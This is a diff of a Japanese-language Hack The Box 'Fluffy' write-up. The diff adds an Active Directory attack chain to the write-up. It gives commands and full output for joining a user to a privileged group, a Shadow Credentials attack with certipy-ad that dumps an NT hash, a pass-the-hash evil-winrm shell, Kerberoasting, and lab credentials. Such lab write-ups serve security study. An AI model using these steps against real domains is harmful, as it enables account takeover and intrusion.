@@ -189,7 +189,7 @@ LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019
 LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
 LDAP        10.129.180.164  389    DC01             winrm service
 ```
-ユーザwirm serviceはspnが設定されいたためkerberoast経由でtgsは取得できたが、rockyou.txtではクラックできなかった
+ユーザwirm serviceはspnが設定されていたためkerberoast経由でtgsは取得できたが、rockyou.txtではクラックできなかった
 ```sh
 └─$ netexec ldap 10.129.180.164 -u j.fleischman -p 'J0elTHEM4n1990!' --kdcHost 10.129.180.164 --kerberoasting kerberoas.txt
 LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
@@ -205,24 +205,74 @@ LDAP        10.129.180.164  389    DC01             $krb5tgs$23$*winrm_svc$FLUFF
 ```
 
 
-## STEP 2
+## STEP 
+bloodhound実行
 ```sh
-└─$ netexec ldap 10.129.180.164 --dns-server 10.129.180.164 -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound --collection All
+└─$ netexec ldap 10.129.180.164 --dns-server 10.129.180.164 -u p.agila -p 'prometheusx-303' --bloodhound --collection All
 LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
 LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
 LDAP        10.129.180.164  389    DC01             Resolved collection methods: dcom, container, rdp, objectprops, acl, localadmin, group, psremote, session, trusts
 LDAP        10.129.180.164  389    DC01             Done in 01M 02S
 LDAP        10.129.180.164  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip
-
-└─$ cp /home/kali/.nxc/logs/DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip .
-
-└─$ unzip DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip 
-Archive:  DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip
- extracting: DC01_10.129.180.164_2025-10-26_134930_containers.json  
- extracting: DC01_10.129.180.164_2025-10-26_134930_groups.json  
- extracting: DC01_10.129.180.164_2025-10-26_134930_computers.json  
- extracting: DC01_10.129.180.164_2025-10-26_134930_ous.json  
- extracting: DC01_10.129.180.164_2025-10-26_134930_domains.json  
- extracting: DC01_10.129.180.164_2025-10-26_134930_gpos.json  
- extracting: DC01_10.129.180.164_2025-10-26_134930_users.json
 ```
+winrm_svcにShadow Credentials攻撃パスを発見  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_02.png">  
+追加
+```sh
+└─$ impacket-net 'fluffy.htb/p.agila:prometheusx-303@10.129.180.164' group -name 'service accounts' -join p.agila
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Adding user account 'p.agila' to group 'service accounts'
+[+] User account added to service accounts succesfully!
+
+└─$ impacket-net 'fluffy.htb/p.agila:prometheusx-303@10.129.180.164' group -name 'service accounts'              
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+  1. ca_svc
+  2. ldap_svc
+  3. p.agila
+  4. winrm_svc
+```
+```sh
+└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc auto
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[!] Failed to resolve: FLUFFY.HTB
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '84ac41712a68427a9a2621e2efbb7128'
+[*] Adding Key Credential with device ID '84ac41712a68427a9a2621e2efbb7128' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '84ac41712a68427a9a2621e2efbb7128' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+```
+```sh
+└─$ evil-winrm -i 10.129.250.233 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ../desktop/user.txt
+a599d11e8afd3ae88a721964b11b7671
+```
+
+
+## STEP 3
